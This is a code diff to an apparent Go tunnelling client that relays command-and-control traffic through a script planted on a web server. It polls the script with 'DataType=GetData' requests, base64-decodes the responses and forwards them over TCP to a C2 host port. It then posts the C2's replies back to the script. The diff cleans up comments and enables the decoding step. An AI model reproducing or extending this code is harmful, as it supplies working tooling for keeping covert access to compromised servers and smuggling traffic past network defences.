@@ -18,7 +18,6 @@ import (
 var (
 	addr   string
 	target string
-	// wg     sync.WaitGroup
 )
 
 // 获取数据模块
@@ -34,7 +33,6 @@ func GetDate(cli *cli.Context) {
 	resp.Body.Close()
 	if string(content[:15]) == "CONNECT SUCCESS" {
 		fmt.Println(string(content[:15]), "Start getting data ....")
-		// fmt.Println(reflect.TypeOf(client))
 		for {
 			dataResp, err := client.Post(url, "application/x-www-form-urlencoded", strings.NewReader("DataType=GetData"))
 			if err != nil {
@@ -42,21 +40,14 @@ func GetDate(cli *cli.Context) {
 			}
 			data, _ := ioutil.ReadAll(dataResp.Body)
 			dataResp.Body.Close()
-			if string(data) == "NO DATA" {
+			if string(data) == "NO DATA" || len(data) == 0 {
 				continue
 			}
-			// data, _ = base64.URLEncoding.DecodeString(string(data))
-			// wg.Add(1)
-			// reg := regexp.MustCompile(`>|(.*)|<`)
-			// result := reg.FindAllStringSubmatch(string(data), -1)
+			data, _ = base64.URLEncoding.DecodeString(string(data))
 			fmt.Println("获取的数据")
-			// for _, text := range result {
-			// 	fmt.Println(text[1])
-			// }
 			fmt.Println(len(data))
 			fmt.Println(data)
 			SendDate(hostPort, data, url)
-			// wg.Wait()
 		}
 	} else {
 		fmt.Println("Please check if the script exists and runs...")
@@ -67,19 +58,12 @@ var dataBuf = make([]byte, 0, 1046616)
 
 // 数据发送模块
 func SendDate(hostPort string, data []byte, url string) {
-	// defer wg.Done()
 	conn, err := net.Dial("tcp", hostPort)
 	defer conn.Close()
 	if err != nil {
 		fmt.Printf("connect failed, err : %v\n", err.Error())
 		return
 	}
-	// b64Data, _ := base64.URLEncoding.DecodeString(data)
-	// base64.URLEncoding.EncodeToString()
-	// fmt.Println("Send data to C2:")
-	// fmt.Println("--------------------------------------------------------------")
-	// fmt.Println(string(data))
-	// fmt.Println("--------------------------------------------------------------")
 
 	_, err = conn.Write(data)
 	if err != nil {
@@ -101,8 +85,6 @@ func SendDate(hostPort string, data []byte, url string) {
 			}
 		}
 		if C2data == 0 {
-			// fmt.Println("Get data from C2")
-			// fmt.Println(C2data)
 			fmt.Println("发送的数据")
 			fmt.Println(string(dataBuf))
 			C2Send := []byte("DataType=PostData&Data=TO:SEND" + base64.URLEncoding.EncodeToString(dataBuf))
